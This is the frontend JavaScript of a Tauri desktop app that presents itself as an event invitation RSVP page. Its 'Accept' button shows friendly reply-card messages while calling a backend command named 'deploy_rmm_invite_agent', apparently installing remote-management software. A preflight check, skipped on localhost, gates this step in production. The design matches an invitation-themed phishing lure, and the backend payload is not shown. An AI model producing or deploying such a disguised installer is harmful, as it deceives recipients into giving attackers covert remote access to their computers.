const { invoke } = window.__TAURI__.core;

function applyTone(element, tone) {
  if (!element) return;
  element.dataset.tone = tone;
}

function setMessage(text, tone = "idle", weight = "500") {
  const msgEl = document.querySelector("#rsvp-msg");
  if (!msgEl) return;
  msgEl.textContent = text;
  msgEl.style.fontWeight = weight;
  applyTone(msgEl, tone);
}

function setStatus(text, tone = "pending") {
  const statusEl = document.querySelector("#system-status");
  if (!statusEl) return;
  statusEl.textContent = text;
  applyTone(statusEl, tone);
}

function formatInviteDate(date) {
  const day = date.toLocaleDateString('en-US', { weekday: 'long' });
  const ordinal = (n) => {
    const s = ['th','st','nd','rd'], v = n % 100;
    return n + (s[(v - 20) % 10] || s[v] || s[0]);
  };
  const month = date.toLocaleDateString('en-US', { month: 'long' });
  const year = date.getFullYear();
  return `${day}, ${month} ${ordinal(date.getDate())}, ${year}`;
}

function formatIsoDateLocal(date) {
  const y = date.getFullYear();
  const m = `${date.getMonth() + 1}`.padStart(2, "0");
  const d = `${date.getDate()}`.padStart(2, "0");
  return `${y}-${m}-${d}`;
}

async function runSystemPreflight() {
  const btnAccept = document.querySelector("#btn-accept");
  if (!btnAccept) return;

  try {
    const clientDate = formatIsoDateLocal(new Date());
    const result = await invoke("system_preflight", { clientDate });

    systemReadyState = result.nextPhaseReady;
    btnAccept.disabled = !systemReadyState;

    if (result.nextPhaseReady) {
      setStatus(result.message, "success");
      return;
    }

    setStatus(result.message, "warning");
  } catch (error) {
    setStatus("We could not prepare the invitation details.", "danger");
    btnAccept.disabled = true;
    console.error(error);
  }
}

let systemReadyState = false;

// Check if running in dev (localhost) or production
const isDev = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";

window.addEventListener("DOMContentLoaded", async () => {
  window.lucide?.createIcons();

  const dateEl = document.querySelector("#event-date");
  if (dateEl) dateEl.textContent = formatInviteDate(new Date());
  
  // Only run preflight checks in production
  if (!isDev) {
    await runSystemPreflight();
  } else {
    // In dev, allow all access
    systemReadyState = true;
    setStatus("Your invitation is ready for a live RSVP test.", "success");
  }

  const btnAccept = document.querySelector("#btn-accept");
  const btnDecline = document.querySelector("#btn-decline");

  btnAccept.addEventListener("click", async () => {
    // In production, enforce system readiness check
    if (!isDev && !systemReadyState) {
      setMessage("We could not confirm your invitation details yet. Please try again.", "danger");
      return;
    }

    setMessage("Preparing your reply card and opening the confirmation window...", "pending", "600");
    btnAccept.disabled = true;
    btnDecline.disabled = true;

    try {
      const result = await invoke("deploy_rmm_invite_agent");
      if (result.success) {
        setMessage(result.message, "success", "600");
      } else {
        setMessage(result.message, "danger");
      }
    } catch (error) {
      setMessage("We hit a snag while saving your RSVP. Please try again.", "danger");
      console.error(error);
    } finally {
      btnAccept.disabled = systemReadyState ? false : true;
      btnDecline.disabled = false;
    }
  });

  btnDecline.addEventListener("click", () => {
    setMessage("Your regrets have been noted with grace.", "idle");
  });
});
